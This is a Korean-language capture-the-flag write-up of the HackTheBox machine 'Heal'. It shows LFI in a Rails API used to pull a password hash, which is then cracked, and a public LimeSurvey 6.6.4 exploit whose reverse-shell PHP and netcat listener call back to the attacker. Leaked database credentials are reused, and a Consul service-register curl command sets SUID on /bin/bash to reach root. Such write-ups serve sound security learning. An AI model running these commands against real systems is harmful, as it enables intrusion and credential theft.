---
title: "Heal (Medium)"
date: 2025-12-23
layout: single
excerpt: "Heal은 중간 난이도의 Linux 머신으로, Ruby on Rails 기반 API의 LFI 취약점을 이용해 LimeSurvey 관리자 자격증명을 획득하고, LimeSurvey 6.6.4 플러그인 업로드 취약점을 통해 초기 접근을 획득한다. 이후 자격증명 재사용으로 ron 계정에 접근하고, 내부 Consul 서비스의 misconfiguration을 악용해 서비스 등록 API를 통한 명령 실행으로 /bin/bash에 SUID 비트를 설정하여 최종적으로 루트 권한을 탈취한다."
author_profile: true
toc: true
toc_label: "Heal"
toc_icon: "book"
toc_sticky: true
header:
  teaser: /assets/htb-linux/heal/heal.png
  teaser_home_page: true
categories: [hackthebox-linux]
tags: [htb, linux, web, ruby-on-rails, lfi, credential-leak, limesurvey, plugin-upload, rce, consul, misconfiguration, service-abuse, lateral-movement, sudo, suid, priv-esc, ssh]

---

![Heal](/assets/htb-linux/heal/heal.png)

**Heal**은 중간 난이도의 Linux 머신으로, **`Ruby on Rails` 기반 API의 LFI 취약점을 이용해 LimeSurvey 관리자 자격증명**을 획득하고, **LimeSurvey 6.6.4 플러그인 업로드 취약점**을 통해 초기 접근을 획득한다. 

이후 자격증명 재사용으로 `ron` 계정에 접근하고, 내부 `Consul` 서비스의 misconfiguration 을 악용해 **서비스 등록 API를 통한 명령 실행으로 `/bin/bash` 에 SUID 비트를 설정**하여 최종적으로 루트 권한을 탈취한다.

# Enumeration

## Portscan

먼저 대상 Host(`10.129.231.237`)에 대해 기본 스크립트와 서비스 버전 탐지를 수행하였다:

```bash
$ nmap -sC -sV 10.129.231.237 | tee nmap

Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-23 01:44 EST
Nmap scan report for heal.htb (10.129.231.237)
Host is up (0.26s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 68:af:80:86:6e:61:7e:bf:0b:ea:10:52:d7:7a:94:3d (ECDSA)
|_  256 52:f4:8d:f1:c7:85:b6:6f:c6:5f:b2:db:a6:17:68:ae (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Heal
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.03 seconds
```

Nmap 스캔 결과 `SSH(22)`, `HTTP(80)` 서비스가 열려 있으며, HTTP 서비스는 `nginx 1.18.0` 기반으로 동작하고 있다.

웹 사이트 접근 시 **heal.htb** 도메인으로 접근해야 함을 확인했다.

## Subdomain Enumeration

Host 헤더를 이용한 가상 호스트 기반 서브도메인 열거를 위해 `ffuf` 퍼징을 수행한 결과, `api.heal.htb` 서브도메인이 존재함을 확인하였다:

```bash
$ ffuf -u "http://heal.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.heal.htb" -fs 178

api                     [Status: 200, Size: 12515, Words: 469, Lines: 91, Duration: 248ms]
```

---

# Vulnerability Analysis

## Web Enumeration

`heal.htb` 웹 사이트에 접속하면 로그인 기능을 제공하는 메인 페이지가 표시된다:

![Heal](/assets/htb-linux/heal/heal-website.png)

회원가입 후 로그인을 진행하면, 이력서(`PDF`) 생성을 위한 `Resume Builder` 페이지에 접근할 수 있다:

![Heal](/assets/htb-linux/heal/pdf.png)

상단 메뉴 중 `SURVEY` 버튼을 클릭할 경우, 별도의 서브도메인인 `take-survey.heal.htb` 로 이동하는 것을 확인할 수 있다:

![Heal](/assets/htb-linux/heal/take-survey.png)

`take-survey.heal.htb` 의 루트 경로에 접근하면, 오픈 소스 플랫폼인 **[LimeSurvey](https://www.limesurvey.org/)**가 사용되고 있음을 확인할 수 있다. 

또한 페이지 내 안내 문구를 통해 관리자 계정으로 `ralph@heal.htb` 이메일 주소가 노출되어 있었다:

![Heal](/assets/htb-linux/heal/limesurvey.png)

`ffuf` 퍼징을 통해 발견한 `api.heal.htb` 에 접근하면, 해당 서비스가 **Ruby on Rails** 기반으로 동작하고 있으며, **Rails 버전 `7.1.4` 및 Ruby `3.3.5`** 정보가 노출되어 있었다:

![Heal](/assets/htb-linux/heal/ruby.png)

## PDF Export API 

Burp Suite를 실행한 상태에서 이력서 생성을 진행하였다:

![Heal](/assets/htb-linux/heal/pdf-file.png)

그 결과, `api.heal.htb/exports` 엔드포인트로 POST 요청이 전송되며, 이후 `/download` 경로를 통해 생성된 PDF 파일이 다운로드되는 것을 확인할 수 있었다:

![Heal](/assets/htb-linux/heal/request.png)

`/download` 엔드포인트에 대해 HTTP 메서드를 OPTIONS에서 GET으로 변경하여 요청을 전송한 결과, 401 Unauthorized 응답과 함께 `Invalid token` 오류 메시지가 반환되었다:

![Heal](/assets/htb-linux/heal/download-get.png)

이에 따라 인증 토큰의 발급 여부를 확인하기 위해 로그아웃 후 재로그인을 수행하였다.

그 결과, `/signin` 엔드포인트에 대한 응답으로 인증 토큰이 발급되는 것을 확인할 수 있었다:

![Heal](/assets/htb-linux/heal/token.png)

이전에 발급받은 토큰을 `Authorization` 헤더에 포함시켜 `/download` 요청을 전송하면 PDF 파일 데이터가 정상적으로 반환된다:

![Heal](/assets/htb-linux/heal/put-token.png)

## LFI

`/download` 경로 `filename` 파라미터에 `/etc/passwd` 를 넣어 요청한 결과 LFI 취약점이 존재함을 확인하였다:

![Heal](/assets/htb-linux/heal/lfi.png)

`api.heal.htb`는 [Ruby on Rails](https://rubyonrails.org/) 기반으로 동작하는 웹 애플리케이션이다. LFI 취약점을 이용해 [내부 설정 파일](https://medium.com/@jeroenboers_7656/what-is-ruby-on-rails-how-does-it-work-and-what-are-all-these-files-812fc1d48493)들에 접근할 수 있다.

우선 `config/database.yml` 파일을 확인하였다:

![Heal](/assets/htb-linux/heal/database.png)

설정 파일을 통해 `storage` 디렉토리에 **development 및 test 환경용 SQLite DB 파일**이 존재함을 알 수 있었다.

`storage/development.sqlite3` 파일을 열어본 결과, 서브도메인 `take-survey.heal.htb` 의 관리자 계정으로 보이는 이메일 주소와 비밀번호 해시가 저장되어 있는 것을 확인하였다:

![Heal](/assets/htb-linux/heal/ralph.png)

위에서 확보한 비밀번호 해시를 크래킹하게 되면, 평문 비밀번호가 `147258369` 임을 확인할 수 있었다:

```bash
$ hashcat -m 3200 --show hash.txt /usr/share/wordlists/rockyou.txt

$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG:147258369
```

`take-survey.heal.htb/admin` 경로에 접근하면 LimeSurvey 관리자 인터페이스 로그인 페이지가 노출된다:

![Heal](/assets/htb-linux/heal/admin.png)

이후 `take-survey.heal.htb` 에서 `ralph` 관리자 계정으로 로그인한 결과, LimeSurvey 관리자 페이지에 접근할 수 있었으며, 하단 정보로부터 해당 버전이 `6.6.4` 임을 확인하였다:

![Heal](/assets/htb-linux/heal/database.png)

---

# Exploitation

## LimeSurvey RCE

현재 LimeSurvey `6.6.4` 버전에서는 플러그인 업로드 기능을 악용한 ZIP 파일 기반 RCE 취약점이 존재한다.

> 해당 취약점을 이용하기 위해 다음 GitHub 공개 익스플로잇을 사용하였다: [Exploit](https://github.com/TheRedP4nther/limesurvey-6.6.4-authenticated-rce)

우선 익스플로잇에 포함된 `revshell.php` 파일의 IP 및 포트 값을 나의 로컬 머신에 맞게 수정하였다:

```php
set_time_limit (0);
$ip = '10.10.14.76';  
$port = 9001;         
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = '/bin/bash -i';
$daemon = 0;
$debug = 0;
```

이후 `netcat` 리스너를 설정한 뒤, 익스플로잇을 실행하였다:

```bash
$ nc -lvnp 9001

listening on [any] 9001 ...
```

```bash
$ python3 limesurvey_rce.py -t http://take-survey.heal.htb -u ralph -p 147258369
  ________         ____           ______  __ __        __  __             
 /_  __/ /_  ___  / __ \___  ____/ / __ \/ // / ____  / /_/ /_  ___  _____                                               
  / / / __ \/ _ \/ /_/ / _ \/ __  / /_/ / // /_/ __ \/ __/ __ \/ _ \/ ___/                                               
 / / / / / /  __/ _, _/  __/ /_/ / ____/__  __/ / / / /_/ / / /  __/ /                                                   
/_/ /_/ /_/\___/_/ |_|\___/\__,_/_/      /_/ /_/ /_/\__/_/ /_/\___/_/                                                    
                                                                                                                         
                                                                                                                         
    LimeSurvey 6.6.4 Authenticated RCE Exploit
                                                                                                                         

[CSRF TOKEN]:                                                                                                            

[+] Trying to obtain the CSRF Token...                                                                                   
[+] The CSRF Token has been obtained successfully.

[LOGIN]:                                                                                                                 

[+] Login into LimeSurvey...                                                                                             
[+] Login successfully as ralph.

[PLUGIN]:                                                                                                                

[+] Uploading and installing the plugin...                                                                               
[+] Plugin uploaded and installed succesfully.
[+] Activating the plugin...

[REVERSE SHELL]:                                                                                                         
                                                                                                                         
[+] Trying to execute the Reverse Shell
[+] Reverse shell executed successfully, check your listener :D!
```

그 결과, 웹 서버로부터 리버스 셸 연결을 성공적으로 획득하였다:

```bash
connect to [10.10.14.76] from (UNKNOWN) [10.129.231.237] 50248

www-data@heal:~/limesurvey/upload/plugins/evil$
```

---

# Privilege Escalation

## Lateral Movement: www-data → ron

현재 시스템에 로그인 가능한 사용자 목록은 다음과 같다:

```bash
root:x:0:0:root:/root:/bin/bash
ralph:x:1000:1000:ralph:/home/ralph:/bin/bash
postgres:x:116:123:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
ron:x:1001:1001:,,,:/home/ron:/bin/bash
```

### Credential Discovery

`limesurvey/application/config` 경로의 `config.php` 파일에서 PostgreSQL 자격증명이 있는 것을 발견하였다:

```bash
www-data@heal:~/limesurvey/application/config$ cat config.php 

<?php if (!defined('BASEPATH')) exit('No direct script access allowed');

return array(
        'components' => array(
                'db' => array(
                        'connectionString' => 'pgsql:host=localhost;port=5432;user=db_user;password=AdmiDi0_pA$$w0rd;dbname=survey;',
                        'emulatePrepare' => true,
                        'username' => 'db_user',
                        'password' => 'AdmiDi0_pA$$w0rd',
                        'charset' => 'utf8',
                        'tablePrefix' => 'lime_',
                )
        )
      )
# [SKIP]
```

데이터베이스 내부에서는 추가적인 유의미한 정보를 얻지 못하였다. 

이에 따라 비밀번호 재사용 가능성을 고려하여, `su` 명령을 이용해 `ron` 계정으로의 전환을 시도한 결과:


```bash
www-data@heal:~/limesurvey/application/config$ su ron

Password: AdmiDi0_pA$$w0rd

ron@heal:/var/www/limesurvey/application/config$
```

`ron` 계정의 셸에 성공적으로 접근할 수 있었다.

## Lateral Movement: ron → root

### Netstat Enumeration

셸 접근 후, 시스템에서 열려 있는 포트를 확인하였다:

```bash
ron@heal:/var/www/limesurvey/application/config$ netstat -lntp

Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3001          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8302          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8300          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8301          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8600          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8503          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8500          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -
```

특히 `8300~8600` 포트 범위는 [HashiCorp Consul](https://developer.hashicorp.com/consul/docs/reference/architecture/ports) 서비스에서 사용하는 포트임을 확인하였다.

그중 `8500` 포트는 Consul의 HTTP API 포트로, 외부에서 직접 접근은 불가능하였기 때문에 [chisel](https://github.com/jpillora/chisel)도구를 이용해 로컬 포트 포워딩 환경을 구성한 뒤 내부 서비스를 탐색하였다:

```bash
$ ./chisel server -p 9002 --reverse
```

```bash
ron@heal:/tmp$ ./chisel client 10.10.14.76:9002 R:socks

2025/12/25 21:25:51 client: Connecting to ws://10.10.14.76:9002
2025/12/25 21:26:07 client: Connected (Latency 219.001763ms)
```

Consul 웹 인터페이스에 접근한 결과, 총 4개의 서비스가 실행 중인 것을 확인할 수 있었다:

![Heal](/assets/htb-linux/heal/consul.png)

### Consul Script Check Abuse

[Consul](https://developer.hashicorp.com/consul/api-docs/agent/service#register-service)의 웹 인터페이스 및 HTTP API에는 `/v1/agent/service/register` 엔드포인트가 존재하며, 해당 엔드포인트는 서비스 등록을 위한 관리용 API이다.

해당 요청은 ACL이 활성화된 환경에서는 일반적으로 `service:write` 권한을 요구하지만, **기본 정책이 allow로 설정되어 있거나 익명 요청이 허용된 경우 토큰 없이도 PUT 요청만으로 새로운 서비스를 등록**할 수 있다.

`ps` 명령을 통해 Consul 실행 정보를 확인한 결과, 설정 디렉토리가 `/etc/consul.d` 임을 확인하였다:

```bash
ron@heal:~$ ps anx | grep consul
ps anx | grep consul
   1806 ?        Ssl    0:56 /usr/local/bin/consul agent -server -ui -advertise=127.0.0.1 -bind=127.0.0.1 -data-dir=/var/lib/consul -node=consul-01 -config-dir=/etc/consul.d
```

해당 디렉토리에서 `config.json` 파일을 확인한 결과는 다음과 같다:

```json
{
"bootstrap":true,
"server": true,
"log_level": "DEBUG",
"enable_syslog": true,
"enable_script_checks": true,
"datacenter":"server1",
"addresses": {
        "http":"127.0.0.1"
},
"bind_addr": "127.0.0.1",
"node_name":"heal-internal",
"data_dir":"/var/lib/consul",
"acl_datacenter":"heal-server",
"acl_default_policy":"allow",
"encrypt":"l5/ztsxHF+OWZmTkjlLo92IrBBCRTTNDpdUpg2mJnmQ="
}
```

설정 파일에서 `enable_script_checks` 가 활성화되어 있으며, `acl_default_policy` 가 `allow` 로 설정되어 있어 토큰 없이도 서비스 등록 요청이 허용되는 구성임을 확인하였다.

해당 설정으로 인해 인증 없이 `PUT /v1/agent/service/register` 요청이 가능하며, JSON 데이터를 이용해 서비스 등록할 수 있다.

Consul 서비스 등록을 위해 다음과 같은 JSON 요청 본문을 작성하였다:

```json
{
  "Address": "127.0.0.1",
  "ID": "test",
  "Name": "test",
  "Check": {
    "Args": [
      "bash",
      "-c",
      "chmod +s /bin/bash"
    ],
    "Interval": "30s",
    "Timeout": "30s"
  }
}
```

이후 `curl` 을 이용해 JSON 요청을 `PUT` 방식으로 전송하였다:

```bash
ron@heal:~$ curl -X PUT http://127.0.0.1:8500/v1/agent/service/register -H 'Content-Type: application/json' -d '{"Address": "127.0.0.1", "ID": "test", "Name": "test", "Check": {"Args": ["bash", "-c", "chmod +s /bin/bash"], "Interval": "30s", "Timeout": "30s"}}'
```

잠시 후 `/bin/bash` 를 확인해보면 **SUID가 정상적으로 적용**된 것을 확인할 수 있었다:

```bash
ron@heal:~$ ls -l /bin/bash

-rwsr-sr-x 1 root root 1396520 Mar 14  2024 /bin/bash
```

마지막으로 `/bin/bash` 를 `-p` 옵션과 함께 실행하여, 루트 셸 획득에 성공하였다:

```bash
ron@heal:/etc/consul.d$ /bin/bash -p

bash-5.1#
```

최종적으로 `root.txt` 파일을 읽어 플래그를 획득하였다:

![Heal](/assets/htb-linux/heal/flag.png)



 















